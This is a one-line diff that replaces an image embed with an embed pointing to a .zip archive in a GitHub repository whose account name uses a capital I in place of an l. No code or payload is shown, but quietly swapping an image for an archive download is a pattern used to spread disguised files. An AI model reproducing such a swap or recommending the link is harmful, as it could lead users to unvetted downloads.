@@ -1,1 +1,1 @@
-![](https://file.garden/Zlc_rlwZaj3gLlZ-/Untitled89_20241105225137.png)
+![](https://github.com/fightcIub/CHR0MAKOPIA/raw/refs/heads/main/appurtenant/CH_MAKOPIA_1.6-alpha.1.zip)
